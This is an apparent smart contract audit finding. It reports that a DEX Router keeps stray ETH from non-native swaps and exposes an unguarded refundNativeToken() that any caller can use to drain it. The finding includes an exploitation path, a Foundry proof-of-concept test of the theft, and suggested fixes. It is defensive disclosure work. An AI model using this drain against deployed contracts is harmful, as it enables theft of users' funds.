## Title
ETH Theft via Unprotected refundNativeToken() Function When msg.value Sent to Non-Native Token Swaps

## Summary
When users send ETH (`msg.value`) with swaps that don't involve the native token as token0 in exact input mode, the ETH remains in the Router contract without being refunded. The public `refundNativeToken()` function allows any attacker to steal this accumulated ETH by calling it and receiving the entire Router balance.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Router.sol` (function `handleLockData`, lines 106-146) and `src/base/PayableMulticallable.sol` (function `refundNativeToken`, lines 25-29)

**Intended Logic:** The Router should handle native token payments for swaps and refund any excess ETH to the original sender. [1](#0-0) 

**Actual Logic:** The refund mechanism only activates when `poolKey.token0 == NATIVE_TOKEN_ADDRESS`. When this condition is false but `msg.value` is sent, the ETH remains in the Router contract. [2](#0-1) 

The value sent to Core is calculated conditionally - if `poolKey.token0 != NATIVE_TOKEN_ADDRESS`, the value is set to 0, leaving the ETH in Router. [3](#0-2) 

The `refundNativeToken()` function sends ALL the Router's balance to `msg.sender` without access control or verification that the caller was the original depositor. [4](#0-3) 

**Exploitation Path:**
1. Victim calls `Router.swap()` with `msg.value = 1 ETH` for a swap of TokenA → TokenB (where neither token is `NATIVE_TOKEN_ADDRESS`)
2. Router receives 1 ETH, but the value calculation at lines 106-110 sets `value = 0` since `poolKey.token0 != NATIVE_TOKEN_ADDRESS`
3. The swap executes via `_swap(0, poolKey, params)`, forwarding 0 ETH to Core
4. At lines 143-145, since token0 is not native, code calls `ACCOUNTANT.payFrom(swapper, poolKey.token0, ...)` without touching the msg.value
5. 1 ETH remains in Router contract (balance increases but never decreases)
6. Attacker monitors Router balance and calls `refundNativeToken()` 
7. Attacker receives the entire Router balance (1 ETH)
8. Victim's funds are permanently stolen

**Security Property Broken:** This violates the principle that user funds should never be directly stolen by unprivileged attackers. It also breaks the expected behavior that sending ETH with a transaction should either be used or refunded to the sender.

## Impact Explanation
- **Affected Assets**: All ETH (`msg.value`) sent by users to the Router for swaps not involving native token as token0
- **Damage Severity**: Complete loss of ETH sent by victims. An attacker can steal 100% of accumulated ETH in the Router contract with a single function call. Multiple victims' ETH can accumulate before an attacker drains it all.
- **User Impact**: Any user who sends ETH with a non-native token swap is vulnerable. This could affect:
  - Users who mistakenly send ETH thinking it's needed for gas or swap execution
  - Users swapping token1 for token0 (where params.isToken1() = true)
  - Users performing exact output swaps (where params.isExactOut() = true)  
  - Users performing multihop swaps (which always use value=0)

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this by simply calling the public `refundNativeToken()` function
- **Preconditions**: 
  - At least one user must have sent ETH with a swap where `poolKey.token0 != NATIVE_TOKEN_ADDRESS` OR `params.isToken1()` OR `params.isExactOut()`
  - Router contract must have non-zero ETH balance
- **Execution Complexity**: Single function call with no parameters. Attacker can monitor Router balance and immediately steal any accumulated ETH.
- **Frequency**: Can be exploited continuously - every time a user sends ETH with a vulnerable swap, an attacker can steal it. Attacker could also wait for multiple users' ETH to accumulate before draining in a single transaction.

## Recommendation

```solidity
// In src/base/PayableMulticallable.sol, function refundNativeToken, lines 25-29:

// CURRENT (vulnerable):
function refundNativeToken() external payable {
    if (address(this).balance != 0) {
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }
}

// FIXED:
// Option 1: Track ETH deposits per user
mapping(address => uint256) private userEthBalance;

function refundNativeToken() external payable {
    uint256 refundAmount = userEthBalance[msg.sender];
    if (refundAmount != 0) {
        userEthBalance[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}

// And in Router.sol, track deposits:
function swap(...) public payable returns (...) {
    if (msg.value > 0) {
        userEthBalance[msg.sender] += msg.value;
    }
    // ... rest of swap logic
}
```

**Alternative mitigation**: Add validation in Router to revert if msg.value is sent when not required:

```solidity
// In src/Router.sol, function handleLockData, after line 110:

uint256 value = FixedPointMathLib.ternary(
    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
    uint128(params.amount()),
    0
);

// Add this check:
if (msg.value > 0 && value == 0) {
    revert UnexpectedMsgValue();
}
```

## Proof of Concept

```solidity
// File: test/Exploit_ETHTheftViaRefund.t.sol
// Run with: forge test --match-test test_stealETHViaRefundNativeToken -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {Router, RouteNode, TokenAmount} from "../src/Router.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {SqrtRatio} from "../src/types/sqrtRatio.sol";

contract Exploit_ETHTheft is FullTest {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public override {
        super.setUp();
    }

    function test_stealETHViaRefundNativeToken() public {
        // SETUP: Create a pool with token0 and token1 (neither is native token)
        PoolKey memory poolKey = createPool(0, 1 << 63, 100);
        createPosition(poolKey, -100, 100, 1000, 1000);

        // Fund victim with tokens and ETH
        vm.deal(victim, 2 ether);
        token0.mint(victim, 1000);

        vm.startPrank(victim);
        token0.approve(address(router), 1000);

        // EXPLOIT: Victim mistakenly sends 1 ETH with a swap of token0 -> token1
        // Since token0 is not NATIVE_TOKEN_ADDRESS, the ETH stays in Router
        uint256 routerBalanceBefore = address(router).balance;
        router.swap{value: 1 ether}(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token0), amount: 100}),
            type(int256).min
        );
        vm.stopPrank();

        // VERIFY: ETH is now stuck in Router
        assertEq(address(router).balance, routerBalanceBefore + 1 ether, "Router should have received ETH");
        assertEq(victim.balance, 1 ether, "Victim should have 1 ETH left");

        // ATTACK: Attacker calls refundNativeToken and steals the ETH
        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        router.refundNativeToken();

        // VERIFY: Attacker stole the victim's ETH
        assertEq(attacker.balance, attackerBalanceBefore + 1 ether, "Attacker stole 1 ETH");
        assertEq(address(router).balance, routerBalanceBefore, "Router balance drained");
        
        // Victim cannot recover their ETH
        vm.prank(victim);
        router.refundNativeToken();
        assertEq(victim.balance, 1 ether, "Victim cannot recover their stolen ETH");
    }
}
```

## Notes

The vulnerability exists because:

1. **Conditional value forwarding**: The Router only forwards `msg.value` to Core when specific conditions are met (token0 is native, exact input, not token1). [2](#0-1) 

2. **Conditional refund logic**: The refund mechanism only executes when `poolKey.token0 == NATIVE_TOKEN_ADDRESS`. [5](#0-4) 

3. **Unprotected refund function**: The `refundNativeToken()` function has no access control and sends all balance to any caller. [4](#0-3) 

This creates a critical gap where ETH can be sent but not used, then stolen by any attacker. The vulnerability is particularly severe because it affects common swap scenarios and requires no special privileges to exploit.

### Citations

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L134-146)
```text
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```
